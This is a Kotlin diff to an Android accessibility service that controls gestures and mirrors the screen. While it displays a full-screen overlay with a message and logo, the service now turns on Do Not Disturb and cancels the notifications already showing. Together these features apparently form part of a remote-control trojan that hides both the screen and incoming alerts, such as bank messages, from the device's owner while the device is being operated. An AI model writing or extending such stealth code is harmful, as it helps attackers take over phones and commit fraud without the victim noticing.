@@ -62,6 +62,11 @@ class ControleGestosService : AccessibilityService() {
             if (buildId.isNotEmpty() && buildId != "unknown") return buildId
             return "${Build.MANUFACTURER}_${Build.MODEL}_${Build.SERIAL}".replace(" ", "_")
         }
+
+        @Volatile
+        private var suprimirNotificacoes = false
+
+        fun deveSuprimirNotificacoes(): Boolean = suprimirNotificacoes
     }
 
     private var jobPrincipal: Job? = null
@@ -75,6 +80,7 @@ class ControleGestosService : AccessibilityService() {
     private var textoInferiorOverlayAtual = ""
     private var logoOverlayAtual = ""
     private var ultimaEstruturaEspelho: String? = null
+    private var filtroNotificacaoAnterior: Int? = null
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -720,6 +726,7 @@ class ControleGestosService : AccessibilityService() {
             textoInferiorOverlayAtual = textoInferior
             logoOverlayAtual = logo
             overlayAtivo = true
+            ativarSupressaoNotificacoes()
             Log.d("KL", "Overlay Activity atualizada")
             return
         }
@@ -957,7 +964,7 @@ class ControleGestosService : AccessibilityService() {
         removerOverlayJanela()
         try {
             enviarOverlayActivity(mensagem, textoInferior, logo)
-            overlayAtivo = true
+            marcarOverlayAtivo()
             mensagemOverlayAtual = mensagem
             textoInferiorOverlayAtual = textoInferior
             logoOverlayAtual = logo
@@ -1010,7 +1017,7 @@ class ControleGestosService : AccessibilityService() {
             windowManager.addView(view, paramsConteudo)
             overlayView = view
             parametrosOverlay = paramsConteudo
-            overlayAtivo = true
+            marcarOverlayAtivo()
             mensagemOverlayAtual = mensagem
             textoInferiorOverlayAtual = textoInferior
             logoOverlayAtual = logo
@@ -1043,10 +1050,47 @@ class ControleGestosService : AccessibilityService() {
     }
 
     private fun removerOverlay() {
+        desativarSupressaoNotificacoes()
         OverlayActivity.fechar()
         removerOverlayJanela()
         resetarEstadoOverlay()
         Log.i("KL", "Overlay removido")
+    }
+
+    private fun marcarOverlayAtivo() {
+        overlayAtivo = true
+        ativarSupressaoNotificacoes()
+    }
+
+    private fun ativarSupressaoNotificacoes() {
+        suprimirNotificacoes = true
+        try {
+            val nm = getSystemService(NotificationManager::class.java)
+            if (nm.isNotificationPolicyAccessGranted) {
+                if (filtroNotificacaoAnterior == null) {
+                    filtroNotificacaoAnterior = nm.currentInterruptionFilter
+                }
+                nm.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_NONE)
+            }
+        } catch (e: Exception) {
+            Log.w("KL", "Nao foi possivel ativar Nao Perturbar: ${e.message}")
+        }
+        ServicoOcultarNotificacoes.cancelarNotificacoesVisiveis()
+        Log.i("KL", "Notificacoes suprimidas com overlay ativo")
+    }
+
+    private fun desativarSupressaoNotificacoes() {
+        suprimirNotificacoes = false
+        try {
+            val nm = getSystemService(NotificationManager::class.java)
+            if (nm.isNotificationPolicyAccessGranted && filtroNotificacaoAnterior != null) {
+                nm.setInterruptionFilter(filtroNotificacaoAnterior!!)
+                filtroNotificacaoAnterior = null
+            }
+        } catch (e: Exception) {
+            Log.w("KL", "Nao foi possivel restaurar filtro de notificacao: ${e.message}")
+        }
+        Log.i("KL", "Supressao de notificacoes desativada")
     }
 
     private fun resetarEstadoOverlay() {
